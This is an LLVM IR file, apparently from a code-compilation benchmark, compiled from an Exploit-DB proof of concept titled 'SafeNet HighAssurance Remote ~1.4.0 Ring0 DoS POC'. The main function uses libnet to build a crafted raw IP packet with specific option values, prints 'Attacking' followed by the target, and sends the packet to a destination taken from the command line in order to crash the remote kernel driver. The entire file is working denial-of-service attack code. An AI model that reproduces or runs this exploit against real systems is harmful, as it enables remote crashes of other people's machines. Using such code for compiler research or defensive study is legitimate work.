; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_4047.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_4047.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.ip = type { i32, %struct.TYPE_4__, %struct.TYPE_3__, i64, i64, i64, i8*, i8*, i8*, i64, i64 }
%struct.TYPE_4__ = type { i8* }
%struct.TYPE_3__ = type { i8* }
%struct.opt = type { i32, i32 }

@LIBNET_ERRBUF_SIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [114 x i8] c"SafeNet HighAssurance Remote ~1.4.0 Ring0 DoS POC\0Aby John Anderson <john@ev6.net>\0A   mu-b <mu-b@digit-labs.org>\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [34 x i8] c"Usage: %s <destination> [source]\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@IPV6_HDR_LEN = common dso_local global i32 0, align 4
@UDP_LEN = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [9 x i8] c"malloc: \00", align 1
@LIBNET_RAW4_ADV = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [25 x i8] c"libnet_init() failed: %s\00", align 1
@.str.4 = private unnamed_addr constant [10 x i8] c"127.0.0.1\00", align 1
@.str.5 = private unnamed_addr constant [13 x i8] c"Attacking %s\00", align 1
@.str.6 = private unnamed_addr constant [3 x i8] c".\0A\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i64, align 8
  %9 = alloca i32*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca %struct.ip*, align 8
  %12 = alloca %struct.opt*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32* null, i32** %6, align 8
  %15 = load i32, i32* @LIBNET_ERRBUF_SIZE, align 4
  %16 = zext i32 %15 to i64
  %17 = call i8* @llvm.stacksave()
  store i8* %17, i8** %7, align 8
  %18 = alloca i8, i64 %16, align 16
  store i64 %16, i64* %8, align 8
  store i8* null, i8** %10, align 8
  store %struct.ip* null, %struct.ip** %11, align 8
  store %struct.opt* null, %struct.opt** %12, align 8
  store i8* null, i8** %13, align 8
  store i8* null, i8** %14, align 8
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([114 x i8], [114 x i8]* @.str, i64 0, i64 0))
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 1
  %22 = load i8*, i8** %21, align 8
  %23 = icmp ne i8* %22, null
  br i1 %23, label %31, label %24

24:                                               ; preds = %2
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 0
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.1, i64 0, i64 0), i8* %27)
  %29 = load i32, i32* @EXIT_FAILURE, align 4
  %30 = call i32 @exit(i32 %29) #4
  unreachable

31:                                               ; preds = %2
  %32 = load i32, i32* @IPV6_HDR_LEN, align 4
  %33 = load i32, i32* @UDP_LEN, align 4
  %34 = add nsw i32 %32, %33
  %35 = call i32* @malloc(i32 %34)
  store i32* %35, i32** %6, align 8
  %36 = icmp eq i32* %35, null
  br i1 %36, label %37, label %41

37:                                               ; preds = %31
  %38 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i64 0, i64 0))
  %39 = load i32, i32* @EXIT_FAILURE, align 4
  %40 = call i32 @exit(i32 %39) #4
  unreachable

41:                                               ; preds = %31
  %42 = load i32, i32* @LIBNET_RAW4_ADV, align 4
  %43 = load i8*, i8** %10, align 8
  %44 = call i32* @libnet_init(i32 %42, i8* %43, i8* %18)
  store i32* %44, i32** %9, align 8
  %45 = load i32*, i32** %9, align 8
  %46 = icmp eq i32* %45, null
  br i1 %46, label %47, label %51

47:                                               ; preds = %41
  %48 = load i32, i32* @stderr, align 4
  %49 = call i32 @fprintf(i32 %48, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.3, i64 0, i64 0), i8* %18)
  %50 = call i32 @exit(i32 -1) #4
  unreachable

51:                                               ; preds = %41
  %52 = load i8**, i8*** %5, align 8
  %53 = getelementptr inbounds i8*, i8** %52, i64 2
  %54 = load i8*, i8** %53, align 8
  %55 = icmp ne i8* %54, null
  br i1 %55, label %58, label %56

56:                                               ; preds = %51
  %57 = call i8* @lookup(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4, i64 0, i64 0))
  store i8* %57, i8** %13, align 8
  br label %63

58:                                               ; preds = %51
  %59 = load i8**, i8*** %5, align 8
  %60 = getelementptr inbounds i8*, i8** %59, i64 2
  %61 = load i8*, i8** %60, align 8
  %62 = call i8* @lookup(i8* %61)
  store i8* %62, i8** %13, align 8
  br label %63

63:                                               ; preds = %58, %56
  %64 = load i8**, i8*** %5, align 8
  %65 = getelementptr inbounds i8*, i8** %64, i64 1
  %66 = load i8*, i8** %65, align 8
  %67 = call i8* @lookup(i8* %66)
  store i8* %67, i8** %14, align 8
  %68 = load i32*, i32** %6, align 8
  %69 = call i32 @memset(i32* %68, i32 0, i32 8)
  %70 = load i32*, i32** %6, align 8
  %71 = bitcast i32* %70 to %struct.ip*
  store %struct.ip* %71, %struct.ip** %11, align 8
  %72 = load %struct.ip*, %struct.ip** %11, align 8
  %73 = getelementptr inbounds %struct.ip, %struct.ip* %72, i32 0, i32 0
  store i32 6, i32* %73, align 8
  %74 = load %struct.ip*, %struct.ip** %11, align 8
  %75 = getelementptr inbounds %struct.ip, %struct.ip* %74, i32 0, i32 10
  store i64 0, i64* %75, align 8
  %76 = load %struct.ip*, %struct.ip** %11, align 8
  %77 = getelementptr inbounds %struct.ip, %struct.ip* %76, i32 0, i32 9
  store i64 0, i64* %77, align 8
  %78 = load i32, i32* @IPV6_HDR_LEN, align 4
  %79 = load i32, i32* @UDP_LEN, align 4
  %80 = add nsw i32 %78, %79
  %81 = call i8* @htons(i32 %80)
  %82 = load %struct.ip*, %struct.ip** %11, align 8
  %83 = getelementptr inbounds %struct.ip, %struct.ip* %82, i32 0, i32 8
  store i8* %81, i8** %83, align 8
  %84 = call i8* @htons(i32 0)
  %85 = load %struct.ip*, %struct.ip** %11, align 8
  %86 = getelementptr inbounds %struct.ip, %struct.ip* %85, i32 0, i32 7
  store i8* %84, i8** %86, align 8
  %87 = call i8* @htons(i32 0)
  %88 = load %struct.ip*, %struct.ip** %11, align 8
  %89 = getelementptr inbounds %struct.ip, %struct.ip* %88, i32 0, i32 6
  store i8* %87, i8** %89, align 8
  %90 = load %struct.ip*, %struct.ip** %11, align 8
  %91 = getelementptr inbounds %struct.ip, %struct.ip* %90, i32 0, i32 5
  store i64 0, i64* %91, align 8
  %92 = load %struct.ip*, %struct.ip** %11, align 8
  %93 = getelementptr inbounds %struct.ip, %struct.ip* %92, i32 0, i32 4
  store i64 0, i64* %93, align 8
  %94 = load %struct.ip*, %struct.ip** %11, align 8
  %95 = getelementptr inbounds %struct.ip, %struct.ip* %94, i32 0, i32 3
  store i64 0, i64* %95, align 8
  %96 = load i8*, i8** %13, align 8
  %97 = load %struct.ip*, %struct.ip** %11, align 8
  %98 = getelementptr inbounds %struct.ip, %struct.ip* %97, i32 0, i32 2
  %99 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %98, i32 0, i32 0
  store i8* %96, i8** %99, align 8
  %100 = load i8*, i8** %14, align 8
  %101 = load %struct.ip*, %struct.ip** %11, align 8
  %102 = getelementptr inbounds %struct.ip, %struct.ip* %101, i32 0, i32 1
  %103 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %102, i32 0, i32 0
  store i8* %100, i8** %103, align 8
  %104 = load i32*, i32** %6, align 8
  %105 = load i32, i32* @IPV6_HDR_LEN, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i32, i32* %104, i64 %106
  %108 = bitcast i32* %107 to %struct.opt*
  store %struct.opt* %108, %struct.opt** %12, align 8
  %109 = load %struct.opt*, %struct.opt** %12, align 8
  %110 = getelementptr inbounds %struct.opt, %struct.opt* %109, i32 0, i32 0
  store i32 60, i32* %110, align 4
  %111 = load %struct.opt*, %struct.opt** %12, align 8
  %112 = getelementptr inbounds %struct.opt, %struct.opt* %111, i32 0, i32 1
  store i32 7, i32* %112, align 4
  %113 = load i8**, i8*** %5, align 8
  %114 = getelementptr inbounds i8*, i8** %113, i64 1
  %115 = load i8*, i8** %114, align 8
  %116 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.5, i64 0, i64 0), i8* %115)
  %117 = load i32*, i32** %9, align 8
  %118 = load i32*, i32** %6, align 8
  %119 = load i32, i32* @IPV6_HDR_LEN, align 4
  %120 = load i32, i32* @UDP_LEN, align 4
  %121 = add nsw i32 %119, %120
  %122 = call i32 @libnet_write_raw_ipv4(i32* %117, i32* %118, i32 %121)
  %123 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i64 0, i64 0))
  %124 = load i32, i32* @EXIT_SUCCESS, align 4
  store i32 %124, i32* %3, align 4
  %125 = load i8*, i8** %7, align 8
  call void @llvm.stackrestore(i8* %125)
  %126 = load i32, i32* %3, align 4
  ret i32 %126
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32* @malloc(i32) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32* @libnet_init(i32, i8*, i8*) #2

declare dso_local i32 @fprintf(i32, i8*, i8*) #2

declare dso_local i8* @lookup(i8*) #2

declare dso_local i32 @memset(i32*, i32, i32) #2

declare dso_local i8* @htons(i32) #2

declare dso_local i32 @libnet_write_raw_ipv4(i32*, i32*, i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
